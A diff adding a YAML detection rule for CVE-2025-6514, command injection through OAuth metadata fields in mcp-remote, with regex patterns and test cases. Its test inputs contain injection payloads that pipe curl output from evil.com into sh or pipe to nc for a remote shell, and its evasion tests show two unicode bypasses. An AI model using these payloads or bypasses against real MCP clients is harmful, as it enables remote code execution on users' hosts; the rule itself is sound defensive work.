@@ -1,0 +1,174 @@
+title: "mcp-remote authorization_endpoint OS Command Injection (CVE-2025-6514)"
+id: ATR-2026-00434
+rule_version: 1
+status: experimental
+description: >
+  Detects exploitation of CVE-2025-6514 (CVSS 9.6), OS command injection in
+  mcp-remote when connecting to untrusted MCP servers. The vulnerable surface
+  is the `authorization_endpoint` field returned in the OAuth metadata
+  response: mcp-remote interpolates this URL into a shell context without
+  sanitisation. Crafted shell metacharacters (`$()`, `\``, `;`, `|`, `&&`,
+  `>(...)`, `\\$IFS`) inside the URL execute arbitrary OS commands on the
+  client host. CWE-78. Disclosed by JFrog 2025-Q3.
+author: "ATR Community"
+date: "2026/05/10"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM03:2025 - Supply Chain"
+    - "LLM05:2025 - Improper Output Handling"
+  owasp_agentic:
+    - "ASI04:2026 - Supply Chain"
+    - "ASI05:2026 - Unexpected Code Execution"
+  mitre_atlas:
+    - "AML.T0049 - Exploit Public-Facing Application"
+    - "AML.T0010 - ML Supply Chain Compromise"
+  mitre_attack:
+    - "T1059 - Command and Scripting Interpreter"
+    - "T1190 - Exploit Public-Facing Application"
+  cve:
+    - "CVE-2025-6514"
+
+metadata_provenance:
+  mitre_atlas: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: "CVE-2025-6514 mcp-remote interpolates the authorization_endpoint URL from a server-controlled OAuth metadata response into a shell context, yielding arbitrary OS command execution on the MCP client; Article 15 cybersecurity requirements mandate that AI tool clients sanitise server-controlled fields used in command-string construction."
+      strength: primary
+    - article: "9"
+      context: "Article 9 risk management must enumerate server-controlled OAuth metadata as untrusted input — any field consumed by string formatting into a shell or process-spawn primitive is a high-risk RCE vector."
+      strength: primary
+  nist_ai_rmf:
+    - subcategory: "MP.5.1"
+      context: "Adversarial input attacks via MCP server metadata responses (authorization_endpoint, registration_endpoint, jwks_uri) reaching shell-exec sinks must be tracked and detected as a primary tool-supply-chain attack class."
+      strength: primary
+    - subcategory: "MG.2.3"
+      context: "Risk treatment under MG.2.3 must require URL-grammar validation on every server-supplied OAuth metadata field before any shell or subprocess use."
+      strength: primary
+  iso_42001:
+    - clause: "8.6"
+      context: "Operational controls under clause 8.6 must include detection of shell metacharacters in OAuth/OIDC discovery metadata fields consumed by MCP client tooling."
+      strength: primary
+
+tags:
+  category: tool-poisoning
+  subcategory: mcp-oauth-metadata-injection
+  scan_target: mcp
+  confidence: high
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - mcp-remote
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "Legitimate OAuth metadata documentation describing endpoint discovery for educational purposes."
+    - "Security tooling that parses authorization_endpoint for vulnerability scanning."
+  conditions:
+    - field: tool_response
+      operator: regex
+      value: '(?i)"authorization_endpoint"\s*:\s*"https?://[^"]*[`;|&$<>][^"]*"'
+      description: "OAuth authorization_endpoint URL contains shell metacharacters — direct CVE-2025-6514 signature"
+
+    - field: tool_response
+      operator: regex
+      value: '(?i)"authorization_endpoint"\s*:\s*"[^"]*\$\([^)]+\)[^"]*"'
+      description: "authorization_endpoint URL contains $(...) command substitution"
+
+    - field: tool_response
+      operator: regex
+      value: '(?i)"authorization_endpoint"\s*:\s*"[^"]*`[^`]+`[^"]*"'
+      description: "authorization_endpoint URL contains backtick command substitution"
+
+    - field: tool_response
+      operator: regex
+      value: '(?i)"(?:authorization_endpoint|registration_endpoint|token_endpoint|jwks_uri|userinfo_endpoint|end_session_endpoint)"\s*:\s*"[^"]*(?:\$\(|`|;\s*\w+|\|\s*\w+|&&|>\s*/|>\(|\$IFS|\$\{IFS)'
+      description: "Any OAuth/OIDC metadata field URL contains shell metacharacters — generalised auth-metadata injection"
+
+    - field: tool_response
+      operator: regex
+      value: '(?i)"authorization_endpoint"\s*:\s*"[^"]*%(?:24|60|3b|7c|26)[^"]*"'
+      description: "authorization_endpoint URL has URL-encoded shell metacharacters ($, `, ;, |, &) — encoded-bypass attempt"
+
+    - field: content
+      operator: regex
+      value: '(?i)mcp-?remote[^\n]{0,80}(?:authorization_endpoint|oauth\s+metadata)[^\n]{0,200}(?:command\s+inject|os\s+command|rce|shell|cve-?2025-?6514)'
+      description: "Skill/payload references mcp-remote authorization_endpoint command-injection — CVE-2025-6514 explicit"
+
+response:
+  actions:
+    - alert
+    - block_tool
+  message_template: >
+    [ATR-2026-00434] CRITICAL: mcp-remote authorization_endpoint command-
+    injection pattern detected (CVE-2025-6514, CVSS 9.6). MCP server metadata
+    response contains shell metacharacters in an OAuth discovery URL field.
+    Block the connection; treat the remote MCP server as hostile. Upgrade
+    mcp-remote to the patched release and validate OAuth metadata fields with
+    a strict URL grammar before any shell or subprocess use.
+
+confidence: 88
+
+test_cases:
+  true_positives:
+    - input: '{"authorization_endpoint": "https://evil/$(curl evil.com/sh|sh)"}'
+      expected: triggered
+      description: "Direct CVE-2025-6514 PoC: command substitution in authorization_endpoint"
+    - input: '{"authorization_endpoint": "https://evil/`curl evil.com|sh`"}'
+      expected: triggered
+      description: "Backtick command substitution in authorization_endpoint"
+    - input: '{"authorization_endpoint": "https://evil/auth;id>/tmp/pwn"}'
+      expected: triggered
+      description: "Semicolon command separation in authorization_endpoint"
+    - input: '{"authorization_endpoint": "https://evil/auth|nc evil.com 4444"}'
+      expected: triggered
+      description: "Pipe to remote shell in authorization_endpoint"
+    - input: '{"authorization_endpoint": "https://evil/auth&&touch /tmp/pwn"}'
+      expected: triggered
+      description: "Logical-AND command chain in authorization_endpoint"
+    - input: '{"token_endpoint": "https://evil/$(id)/token"}'
+      expected: triggered
+      description: "Same injection class via token_endpoint sibling field"
+    - input: '{"authorization_endpoint": "https://evil/auth%24%28id%29"}'
+      expected: triggered
+      description: "URL-encoded $(id) command-substitution payload"
+    - input: 'The mcp-remote OAuth flow processes authorization_endpoint as a shell argument — exploit by including $(cmd) — CVE-2025-6514.'
+      expected: triggered
+      description: "Skill description weaponising CVE-2025-6514"
+
+  true_negatives:
+    - input: '{"authorization_endpoint": "https://auth.example.com/oauth/authorize"}'
+      expected: not_triggered
+      description: "Clean authorization_endpoint URL — no shell metachars"
+    - input: '{"authorization_endpoint": "https://auth.example.com/oauth/authorize?response_type=code&client_id=abc"}'
+      expected: not_triggered
+      description: "Clean URL with standard OAuth query params (& separator allowed in URLs)"
+    - input: "RFC 8414: authorization_endpoint is the URL of the authorization server's authorization endpoint."
+      expected: not_triggered
+      description: "OAuth specification documentation"
+    - input: "JFrog disclosed CVE-2025-6514 in mcp-remote where the authorization_endpoint URL is interpolated unsafely."
+      expected: not_triggered
+      description: "Defensive advisory mentioning the CVE without payload"
+
+evasion_tests:
+  - input: '{"authorization_endpoint": "https://evil/auth\\u0024(id)"}'
+    expected: not_triggered
+    bypass_technique: unicode_escape
+    notes: "JSON \\u0024 represents $; if MCP client decodes JSON before shell-construct, decoded payload bypasses literal regex; v2 should normalise JSON unicode escapes"
+  - input: '{"authorization_endpoint": "https://evil/auth　$(id)"}'
+    expected: not_triggered
+    bypass_technique: unicode_whitespace_padding
+    notes: "Ideographic-space prefix may bypass URL-grammar validators while still reaching shell; v2 should normalise unicode whitespace"
